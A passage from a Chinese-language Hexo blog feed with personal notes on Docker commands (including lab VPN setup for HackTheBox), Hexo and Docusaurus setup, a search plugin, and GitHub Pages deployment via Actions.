source ./test1.sh</span></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$name</span></span></code></pre></div></div><blockquote><p>注：被包含的文件 test1.sh 不需要可执行权限。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker 技术</title>
      <link href="/2021/07/06/docker/"/>
      <url>/2021/07/06/docker/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker-是什么"><a href="#Docker-是什么" class="headerlink" title="Docker 是什么"></a>Docker 是什么</h2><p>docker是可以以极低资源运行的一个独立于文件系统的一个空间</p><h3 id="几个基本概念"><a href="#几个基本概念" class="headerlink" title="几个基本概念"></a>几个基本概念</h3><ul><li><code>image</code>  镜像， 类似于类的概念</li><li><code>container</code> 容器， 类似于实例的概念</li></ul><h3 id="docker-在windows下的使用"><a href="#docker-在windows下的使用" class="headerlink" title="docker 在windows下的使用"></a>docker 在windows下的使用</h3><p>docker一般是Linux系统下的工具，但是当windows出了个WSL后，docker就以一个WSL在windows下运行了。</p><p>每一个WSL在windows中都是独立的<code>vhdx</code>文件</p><p>可以通过<code>wsl -l -v</code> 查看docker文件， 通过<code>wsl -d docker-desktop</code>进入</p><h4 id="windows下的配置"><a href="#windows下的配置" class="headerlink" title="windows下的配置"></a>windows下的配置</h4><h5 id="修改存储位置"><a href="#修改存储位置" class="headerlink" title="修改存储位置"></a>修改存储位置</h5><ul><li><a href="https://blog.csdn.net/austindev/article/details/110387609">参考</a>这篇文章</li></ul><p>原理是将docker<code>export</code>出来后，<code>import</code>到新的地方</p><p>我保存的地方是<code>D:\Subsystem\docker-desktop-data</code></p><h5 id="关于image到底存在哪里"><a href="#关于image到底存在哪里" class="headerlink" title="关于image到底存在哪里"></a>关于image到底存在哪里</h5><ul><li><a href="https://www.freecodecamp.org/news/where-are-docker-images-stored-docker-container-paths-explained/">这篇文章</a>讲述了image存放的问题。</li></ul><p>windows是按照虚拟机的方式存储，而要进入这个虚拟机是通过各个images，命令如下：</p><p><code>docker run -it --privileged --pid=host &lt;image&gt; nsenter -t 1 -m -u -i bash</code></p><p>而每个image其实是通过底下一层image叠加上来的，所以可以找到<code>/var/lib/docker/overlay2</code>中每一层叠加的内容</p><h2 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h2><ul><li><a href="https://www.runoob.com/docker/docker-command-manual.html">这里</a>是常用命令大全</li></ul><h3 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h3><p>在获取镜像前，可以通过<code>docker search</code> 来镜像查找相关内容。但是有的是需要特定版本的，这个需要先在<a href="https://hub.docker.com/">hub.docker.com</a>上确认版本。</p><ul><li><code>docker pull &lt;镜像&gt;:&lt;版本&gt;</code></li></ul><h3 id="创建自己的镜像"><a href="#创建自己的镜像" class="headerlink" title="创建自己的镜像"></a>创建自己的镜像</h3><p>方法是使用<code>Dockerfile</code>，在里面写好后使用</p><p><code>docker build -t &lt;image_name&gt; .</code> 创建</p><h3 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h3><ul><li><code>docker ps</code> 查看运行中的容器</li><li><code>docker ps -a</code> 查看所有容器</li><li><code>docker images</code> 查看存在的镜像</li></ul><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>以<code>docker run</code>开头</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>--name &lt;alias&gt;</code></td><td align="center">容器别名</td></tr><tr><td align="center"><code>-v &lt;主机文件&gt;:&lt;容器文件&gt;</code></td><td align="center">挂载如果没有文件会自动创建</td></tr><tr><td align="center"><code>-it</code></td><td align="center">交互界面</td></tr><tr><td align="center"><code>-d</code></td><td align="center">后台运行</td></tr><tr><td align="center"><code>-p &lt;主机端口&gt;:&lt;容器端口&gt;</code></td><td align="center">将主机的端口映射到容器的端口中</td></tr><tr><td align="center"><code>-e &lt;环境变量=Value&gt;</code></td><td align="center">设置环境变量</td></tr></tbody></table><p>例子：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker run --name  myphp-fpm -v ~/nginx/www:/www  -d php:5.6-fpm</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker run --name apache -v <span class="hljs-variable">$PWD</span>:/usr/<span class="hljs-built_in">local</span>/apache2/htdocs -p 8088:80  -it httpd /bin/bash</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker run -it httpd /bin/bash</span></code></pre></div></div><p>像<code>php</code>这样的可能会立马就退出了，所以需要打开一个Shell来保活。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker run -itd php bash</span></code></pre></div></div><h3 id="容器执行命令"><a href="#容器执行命令" class="headerlink" title="容器执行命令"></a>容器执行命令</h3><p>以<code>docker exec</code> 开头</p><ul><li><code>-it</code> 交互</li></ul><p>例子：</p><ul><li><code>docker exec apache ls /usr/local/apache2/htdocs</code></li><li><code>docker exec -it apache /bin/bash</code></li></ul><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>当创建了容器后会一直保留，所以需要删除</p><ul><li><p>删除所有退出的容器</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker rm -v `docker ps -aq -f status=exited`</span></code></pre></div></div></li><li><p>删除镜像</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker rmi &lt;image ID&gt;</span></code></pre></div></div></li></ul><p>docker 提供了更为简单的方法</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-gauss codeBlockLines"><span class="line">docker <span class="hljs-keyword">system</span> prune <span class="hljs-meta">#将对没有用的容器的网络进行删除</span></span><span class="line">docker container prune <span class="hljs-meta"># 删除所有退出状态的容器</span></span><span class="line">docker <span class="hljs-built_in">volume</span> prune <span class="hljs-meta"># 删除未被使用的数据卷</span></span><span class="line">docker image prune <span class="hljs-meta"># 删除 dangling 或所有未被使用的镜像</span></span></code></pre></div></div><ul><li><a href="https://www.cnblogs.com/sparkdev/p/9177283.html">参考文章</a></li></ul><h3 id="Commit容器"><a href="#Commit容器" class="headerlink" title="Commit容器"></a>Commit容器</h3><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li><code>Ctrl + P + Q</code> 退出并后台运行</li></ul><h2 id="Docker-容器间的通讯"><a href="#Docker-容器间的通讯" class="headerlink" title="Docker 容器间的通讯"></a>Docker 容器间的通讯</h2><ul><li><a href="https://my.oschina.net/thinwonton/blog/2993309">这里</a>是参考文章</li></ul><p>原理是docker内置了Bridge网桥组件，各个容器会分配IP地址，但是只有自定义的Bridge网络才能互相通讯</p><ul><li><p>创建自定义Bridge网络</p><ul><li><code>docker network create --driver bridge busybox_bridge</code></li></ul></li><li><p>将容器绑定到自定义Bridge网络中</p><ul><li><code>docker run -itd --network busybox_bridge --name busybox5 busybox</code></li></ul></li></ul><h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h2><p><code>docker-compose</code>是可以将多个镜像通过一套制定的规则统一运行起来的工具。极大的方便了每次启动docker需要麻烦配置的动作。</p><p>使用<code>YAML</code>文件配置</p><p><a href="https://cch20094.medium.com/docker-compose%E6%9E%B6%E8%A8%ADphp-mysql-apache-710321374758">这篇</a>介绍了如何使用<code>docker-compose</code>来搭建<code>PHP + Apache + MySql</code>的环境</p><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><h3 id="Docker-容器的端口修改"><a href="#Docker-容器的端口修改" class="headerlink" title="Docker 容器的端口修改"></a>Docker 容器的端口修改</h3><ol><li><p>关闭容器 <code>docker stop &lt;container&gt;</code></p></li><li><p>进入镜像的存储地方</p><ul><li><code>docker run -it --privileged --pid=host &lt;image&gt; nsenter -t 1 -m -u -i bash</code></li></ul></li><li><p>找到存储的容器点</p><ul><li><code>cd /var/lib/docker/containers/&lt;contian ID&gt;</code></li></ul></li><li><p>修改hostconfig.json 和 config.v2.json</p></li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-vala codeBlockLines"><span class="line"><span class="hljs-meta"># vim hostconfig.json</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">&quot;PortBindings&quot;</span>:&#123;<span class="hljs-string">&quot;5711/tcp&quot;</span>:[&#123;<span class="hljs-string">&quot;HostIp&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;HostPort&quot;</span>:<span class="hljs-string">&quot;5711&quot;</span>&#125;]&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-meta">#vim config.v2.json</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">&quot;ExposedPorts&quot;</span>:&#123;<span class="hljs-string">&quot;5711/tcp&quot;</span>:&#123;&#125;&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-string">&quot;Ports&quot;</span>:&#123;<span class="hljs-string">&quot;5711/tcp&quot;</span>:[&#123;<span class="hljs-string">&quot;HostIp&quot;</span>:<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-string">&quot;HostPort&quot;</span>:<span class="hljs-string">&quot;5711&quot;</span>&#125;]&#125;</span></code></pre></div></div><ol start="5"><li>重启服务 <code>systemctl restart docker</code></li></ol><h3 id="docker-连接-hackthebox"><a href="#docker-连接-hackthebox" class="headerlink" title="docker 连接 hackthebox"></a>docker 连接 hackthebox</h3><p>问题1：<br>/dev/net/tun: not the file</p><ul><li><a href="https://stackoverflow.com/questions/30547484/calling-openconnect-vpn-client-in-docker-container-shows-tunsetiff-failed-opera">解决连接</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-applescript codeBlockLines"><span class="line">docker <span class="hljs-built_in">run</span> -<span class="hljs-keyword">it</span> <span class="hljs-comment">--privileged mykali /bin/bash</span></span></code></pre></div></div><p>加入所有权限，或者只加入一个能力<code>--cap-add SYS_NET_ADMIN --device /dev/net/tun </code></p><p>问题2：<br><code> Linux can&#39;t add IPv6 to interface tun0</code></p><p>没有开启ipv6</p><ul><li><code>--sysctl net.ipv6.conf.all.disable_ipv6=0</code></li></ul><h3 id="Docker-kali-connect-to-hackthebox"><a href="#Docker-kali-connect-to-hackthebox" class="headerlink" title="Docker kali connect to hackthebox"></a>Docker kali connect to hackthebox</h3><ul><li><a href="https://amar-laksh.github.io/2019/08/24/Setting-up-Kali-docker-for-HackTheBox.html">参考链接</a></li></ul><p>端口转发</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">socat</span> TCP<span class="hljs-number">4</span>-LISTEN:<span class="hljs-number">1633</span>,reuseaddr,fork TCP<span class="hljs-number">4</span>:<span class="hljs-number">10.10.10.28:80</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo 部署</title>
      <link href="/2021/07/05/hexo-%E9%83%A8%E7%BD%B2/"/>
      <url>/2021/07/05/hexo-%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li><a href="https://hexo.io/zh-cn/docs/">hexo 的文档</a></li></ul><p><code>hexo</code>基于<code>Node.js</code>开发，安装简单</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-cmake codeBlockLines"><span class="line">npm <span class="hljs-keyword">install</span> hexo -g</span></code></pre></div></div><blockquote><p>如果要部署的话，<code>npm install</code>就可以了，因为<code>node_module</code>中已经包含了<code>hexo</code></p></blockquote><h2 id="安装3-hexo主题"><a href="#安装3-hexo主题" class="headerlink" title="安装3-hexo主题"></a>安装3-hexo主题</h2><ul><li><a href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo 的文档</a></li></ul><h2 id="hexo-的基本使用"><a href="#hexo-的基本使用" class="headerlink" title="hexo 的基本使用"></a>hexo 的基本使用</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-gauss codeBlockLines"><span class="line">hexo <span class="hljs-keyword">new</span> [<span class="hljs-built_in">title</span>]   <span class="hljs-meta"># 按照模板创建新的post文章</span></span><span class="line">hexo <span class="hljs-keyword">new</span> draft [<span class="hljs-built_in">title</span>]  <span class="hljs-meta"># 创建一个草稿</span></span><span class="line">hexo generate      <span class="hljs-meta"># 静态编译</span></span><span class="line">hexo list post     <span class="hljs-meta"># 查看已发布的文章</span></span><span class="line">hexo publish draft &lt;filename&gt;      <span class="hljs-meta"># 将草稿draft 转到 post</span></span><span class="line">hexo server --draft   <span class="hljs-meta"># 将草稿也渲染出来</span></span></code></pre></div></div><h2 id="在Github上部署"><a href="#在Github上部署" class="headerlink" title="在Github上部署"></a>在Github上部署</h2><p>我使用的方式为Action部署到<code>gh-page</code>分支上</p><p><code>.github/workflows/hexo.yml</code> 文件</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">Github</span> <span class="hljs-string">pages</span></span><span class="line"><span class="hljs-attr">on:</span></span><span class="line">  <span class="hljs-attr">push:</span></span><span class="line">    <span class="hljs-attr">branches:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span></span><span class="line"><span class="hljs-attr">jobs:</span></span><span class="line">  <span class="hljs-attr">build-and-deploy:</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">persist-credentials:</span> <span class="hljs-literal">false</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">and</span> <span class="hljs-string">Build</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        npm install</span></span><span class="line"><span class="hljs-string">        node_modules/hexo/bin/hexo generate</span></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">JamesIves/github-pages-deploy-action@releases/v3</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">ACCESS_TOKEN:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.ACCESS_TOKEN</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">        <span class="hljs-attr">BRANCH:</span> <span class="hljs-string">gh-pages</span></span><span class="line">        <span class="hljs-attr">FOLDER:</span> <span class="hljs-string">public</span></span><span class="line">        <span class="hljs-attr">BUILD_SCRIPT:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">node_modules/hexo/bin/hexo</span> <span class="hljs-string">generate</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docusaurus 实现搜索功能</title>
      <link href="/2021/06/28/docu%E5%AE%9E%E7%8E%B0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/"/>
      <url>/2021/06/28/docu%E5%AE%9E%E7%8E%B0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<p>Docusaurus 官方给出了一个添加搜索的方式<a href="https://docusaurus.io/zh-CN/docs/search"> Algolia DocSearch</a>，但是这个搜索插件需要得到Algolia官方的认证，如果你的网站还处于建设阶段，那么就不会被允许使用。</p><p>在网上搜索后发现了<a href="https://github.com/cmfcmf/docusaurus-search-local">search-local</a>的插件，这个插件为本地离线搜索。</p><ul><li><a href="https://docusaurus.io/feedback/p/offline-search">这里</a>是关于离线搜索的讨论</li></ul><h2 id="docusaurus-lunr-search-使用方法"><a href="#docusaurus-lunr-search-使用方法" class="headerlink" title="docusaurus-lunr-search 使用方法"></a>docusaurus-lunr-search 使用方法</h2><h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">yarn <span class="hljs-keyword">add</span> <span class="hljs-variable">@cmfcmf</span><span class="hljs-operator">/</span>docusaurus<span class="hljs-operator">-</span><span class="hljs-keyword">search</span><span class="hljs-operator">-</span><span class="hljs-keyword">local</span></span></code></pre></div></div><p>注意，在官方文档中是不支持中文搜索的。在查看源码后发现，这个插件使用的是<a href="https://github.com/MihaiValentin/lunr-languages">lunr-language</a>来进行分词的，<br>在最新版本中已经包含了中文分词，并且依赖<a href="https://www.npmjs.com/package/nodejieba">nodejieba</a>。</p><p>所以要再安装<code>nodejieba</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ebnf codeBlockLines"><span class="line"><span class="hljs-attribute">yarn nodejieba</span></span></code></pre></div></div><blockquote><p><code>nodejieba</code>的安装依赖python，并且python的安装目录不能有中文<br>如果python已经安装到了中文目录，那么<code>npm install nodejieba</code>是可以安装的，然后<code>yarn install</code>。<br>千万别直接<code>yarn</code>。这将会导致代码框中的copy无法使用。</p></blockquote><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-coffeescript codeBlockLines"><span class="line"><span class="hljs-built_in">module</span>.<span class="hljs-built_in">exports</span> = &#123;</span><span class="line">  plugins: [</span><span class="line">    [</span><span class="line">      <span class="hljs-built_in">require</span>.resolve(<span class="hljs-string">&#x27;@cmfcmf/docusaurus-search-local&#x27;</span>),</span><span class="line">      &#123;</span><span class="line">        indexDocs: <span class="hljs-literal">true</span>,</span><span class="line">        indexBlog: <span class="hljs-literal">true</span>,</span><span class="line">        docsRouteBasePath: <span class="hljs-string">&#x27;/doc&#x27;</span>,</span><span class="line">        blogRouteBasePath: <span class="hljs-string">&#x27;/blog&#x27;</span>,</span><span class="line">        language: [<span class="hljs-string">&#x27;en&#x27;</span>, <span class="hljs-string">&#x27;zh&#x27;</span>],</span><span class="line">      &#125;</span><span class="line">    ],</span><span class="line">  ],</span><span class="line">&#125;</span></code></pre></div></div><p>最后编译 <code>npm run build</code> 即可。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这个插件只能在静态页面中生效，也就是部署了之后才能看到</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ebnf codeBlockLines"><span class="line"><span class="hljs-attribute">yarn build</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docusaurus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docusaurus 报错清单</title>
      <link href="/2021/06/28/docu%E6%8A%A5%E9%94%99%E6%B8%85%E5%8D%95/"/>
      <url>/2021/06/28/docu%E6%8A%A5%E9%94%99%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<h2 id="gyp-ERR-stack-Error-EACCES"><a href="#gyp-ERR-stack-Error-EACCES" class="headerlink" title="gyp ERR! stack Error: EACCES"></a>gyp ERR! stack Error: EACCES</h2><ul><li>参考<a href="https://stackoverflow.com/questions/52231289/gyp-err-stack-error-eacces-permission-denied-mkdir-var-www-project-name-no">这篇文章</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">apt install python3 </span><span class="line"></br></span><span class="line">npm install yarn -g</span><span class="line">ln -s <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/node-v14.17.1-linux-x64/</span>bin<span class="hljs-regexp">/yarn /u</span>sr<span class="hljs-regexp">/local/</span>bin/yarn</span><span class="line">ln -s <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/node-v14.17.1-linux-x64/</span>bin<span class="hljs-regexp">/yarnpkg /u</span>sr<span class="hljs-regexp">/local/</span>bin/yarnpkg</span><span class="line"></br></span><span class="line">yarn</span></code></pre></div></div><p>尽量使用<code>yarn</code>作为包管理。</p>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docusaurus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docusaurus 的多实例文档部署</title>
      <link href="/2021/06/23/docu-%E7%9A%84%E5%A4%9A%E5%AE%9E%E4%BE%8B%E6%96%87%E6%A1%A3/"/>
      <url>/2021/06/23/docu-%E7%9A%84%E5%A4%9A%E5%AE%9E%E4%BE%8B%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>要实现多实例文档部署其实非常简单，按照<a href="https://docusaurus.io/zh-CN/docs/docs-multi-instance">官方文档</a>就可以操作。但是里面有一些坑需要回避。</p><p>有两种部署方式：</p><ol><li>在<code>doc</code>文件夹内部再添加文件夹，这种方式可以控制版本。</li><li>在根目录下添加文件夹，这种方式不能控制版本。</li></ol><p>本篇讲述第2种方式。第一种方式可以参考<a href="https://www.gitmemory.com/issue/facebook/docusaurus/3299/675409985">这篇文章</a>。</p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-asciidoc codeBlockLines"><span class="line">docs/</span><span class="line"><span class="hljs-bullet">- </span>doc1.md</span><span class="line">resources/</span><span class="line"><span class="hljs-bullet">- </span>doc2.md</span></code></pre></div></div><p>如上加入了<code>resources</code>文件夹，里面包含了<code>doc2.md</code>文件。</p><h2 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h2><p>在<code>docusaurus.config.js</code>文件中需要做出如下<strong>最小</strong>修改：</p><div class="codeBlockContainer"><div class="codeBlockTitle">title="docusaurus.config.js"</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-built_in">module</span>.exports = &#123;</span><span class="line">  <span class="hljs-attr">plugins</span>: [</span><span class="line">    [</span><span class="line">      <span class="hljs-string">&#x27;@docusaurus/plugin-content-docs&#x27;</span>,</span><span class="line">      &#123;</span><span class="line">        <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;resources&#x27;</span>,</span><span class="line">        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;resources&#x27;</span>,</span><span class="line">        <span class="hljs-attr">routeBasePath</span>: <span class="hljs-string">&#x27;resources&#x27;</span>,</span><span class="line">        <span class="hljs-attr">sidebarPath</span>: <span class="hljs-built_in">require</span>.resolve(<span class="hljs-string">&#x27;./sidebarsResources.js&#x27;</span>),</span><span class="line">        <span class="hljs-comment">// ... 其他设置</span></span><span class="line">      &#125;,</span><span class="line">    ],</span><span class="line">  ],</span><span class="line">  <span class="hljs-attr">themeConfig</span>: &#123;</span><span class="line">    <span class="hljs-attr">navbar</span>: &#123;</span><span class="line">      <span class="hljs-attr">items</span>: [&#123;</span><span class="line">      &#123;</span><span class="line marked">        <span class="hljs-attr">to</span>: <span class="hljs-string">&#x27;/resources/doc2&#x27;</span>,   <span class="hljs-comment">// 这里要指定具体的index文档</span></span><span class="line">        <span class="hljs-attr">activeBasePath</span>: <span class="hljs-string">&#x27;resources&#x27;</span>,</span><span class="line">        <span class="hljs-attr">label</span>: <span class="hljs-string">&#x27;这里是文档2&#x27;</span>,</span><span class="line">        <span class="hljs-attr">position</span>: <span class="hljs-string">&#x27;left&#x27;</span></span><span class="line">      &#125;,</span><span class="line">      &#125;]</span><span class="line">    &#125;</span><span class="line">  &#125;</span><span class="line">&#125;;</span></code></pre></div></div><p>最后是对sidebars的调整</p><div class="codeBlockContainer"><div class="codeBlockTitle">title='./sidebarsResources.js'</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-built_in">module</span>.exports = &#123;</span><span class="line">    <span class="hljs-attr">resources</span>: [&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;autogenerated&#x27;</span>, <span class="hljs-attr">dirName</span>: <span class="hljs-string">&#x27;.&#x27;</span> &#125;],</span><span class="line">&#125;</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docusaurus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Github Pages 部署 Blog</title>
      <link href="/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/"/>
      <url>/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p>要使用 Github Pages 来部署博客，首先需要选择使用什么静态框架。</p><p>这里我最终选择了<a href="https://docusaurus.io/zh-CN/docs">Docusaurus</a></p><p>开发与部署的简要流程如下：</p><ol><li><p>使用<code>Docusaurus</code>的脚手架创建初始项目</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-swift codeBlockLines"><span class="line">npx <span class="hljs-meta">@docusaurus</span><span class="hljs-operator">/</span><span class="hljs-keyword">init</span><span class="hljs-meta">@latest</span> <span class="hljs-keyword">init</span> my<span class="hljs-operator">-</span>website classic</span></code></pre></div></div></li><li><p>修改<code>docusaurus.config.js</code>文件中3个重要内容</p></li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line">url: <span class="hljs-string">&#x27;https://elinpf.github.io&#x27;</span>,</span><span class="line"><span class="hljs-attr">organizationName</span>: <span class="hljs-string">&#x27;Elinpf&#x27;</span>, </span><span class="line"><span class="hljs-attr">projectName</span>: <span class="hljs-string">&#x27;elinpf.github.io&#x27;</span>, </span></code></pre></div></div><ol start="3"><li><p>在Github上创建同名仓库<code>Elinpf/Elinpf.github.io</code></p></li><li><p>发布<code>master</code>和<code>gh-pages</code>分支</p></li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">git remote add origin https://github.com/Elinpf/Elinpf.github.io.git</span><span class="line">git push origin master</span><span class="line">git branch -M gh-pages</span><span class="line">git push origin gh-pages</span></code></pre></div></div><ol start="5"><li>将<code>Setting</code>中的Pages发布源改为<code>gh-pages</code>分支</li></ol><p><img src="/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/1.png"></p><ol start="6"><li>将<code>Setting</code>中的<code>Secrets</code>添加一个<code>ACCESS_TOKEN</code>(这里的token就是用户授权的token值，<a href="https://docs.github.com/en/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token">参考这里增加新的授权</a>)</li></ol><p><img src="/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/2.png"></p><ol start="7"><li>在项目中添加文件<code>.github/workflows/docusaurus.yml</code>，来写Action用于自动部署（具体含义参考<a href="http://www.ruanyifeng.com/blog/2019/09/getting-started-with-github-actions.html">这篇文章</a>）</li></ol><div class="codeBlockContainer"><div class="codeBlockTitle">title=".github/workflows/docusaurus.yml"</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">Github</span> <span class="hljs-string">pages</span></span><span class="line"><span class="hljs-attr">on:</span></span><span class="line">  <span class="hljs-attr">push:</span></span><span class="line">    <span class="hljs-attr">branches:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span></span><span class="line"><span class="hljs-attr">jobs:</span></span><span class="line">  <span class="hljs-attr">build-and-deploy:</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">persist-credentials:</span> <span class="hljs-literal">false</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">and</span> <span class="hljs-string">Build</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        npm install</span></span><span class="line"><span class="hljs-string">        npm run-script build </span></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> 